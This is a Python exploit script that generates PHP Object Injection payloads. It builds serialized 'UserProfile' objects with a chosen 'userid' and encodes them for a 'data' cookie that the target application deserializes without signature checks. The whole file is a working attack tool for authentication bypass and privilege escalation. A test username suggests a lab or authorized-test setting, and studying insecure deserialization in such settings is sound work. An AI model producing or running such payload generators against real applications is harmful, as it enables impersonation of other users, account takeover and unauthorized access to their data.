#!/usr/bin/env python3
"""
PHP Object Injection (POI) Exploit Payload Generator

This script generates payloads for exploiting a PHP Object Injection vulnerability
where the 'data' cookie contains a serialized UserProfile object.

Vulnerability: The application deserializes untrusted data from the 'data' cookie
without signature validation, allowing attackers to modify object properties
like 'userid' for authentication bypass/privilege escalation.

Serialized Object Format:
O:11:"UserProfile":2:{s:6:"userid";i:{USERID};s:8:"username";s:{LEN}:"{USERNAME}";}
"""

import base64
import urllib.parse


def generate_payload(target_userid, username="deadendtester"):
    """
    Generate a PHP Object Injection payload for the specified userid.
    
    Args:
        target_userid (int): The userid to inject into the serialized object
        username (str): The username value to include in the object
    
    Returns:
        dict: Contains 'raw', 'base64', 'url_encoded' payload formats
    """
    # Build the serialized PHP object string
    # Format: O:11:"UserProfile":2:{s:6:"userid";i:{USERID};s:8:"username";s:{LEN}:"{USERNAME}";}
    
    username_len = len(username)
    
    serialized = f'O:11:"UserProfile":2:{{s:6:"userid";i:{target_userid};s:8:"username";s:{username_len}:"{username}";}}'
    
    # Base64 encode the serialized string
    base64_encoded = base64.b64encode(serialized.encode()).decode()
    
    # URL-encode the base64 string (replace = with %3D, + with %2B, / with %2F)
    url_encoded = urllib.parse.quote(base64_encoded)
    
    return {
        'raw': serialized,
        'base64': base64_encoded,
        'url_encoded': url_encoded
    }


def decode_payload(url_encoded_payload):
    """
    Decode a payload back to its serialized form for verification.
    
    Args:
        url_encoded_payload (str): URL-encoded base64 serialized object
    
    Returns:
        str: The deserialized serialized object string
    """
    # URL decode first
    base64_decoded = urllib.parse.unquote(url_encoded_payload)
    
    # Then base64 decode
    serialized = base64.b64decode(base64_decoded).decode()
    
    return serialized


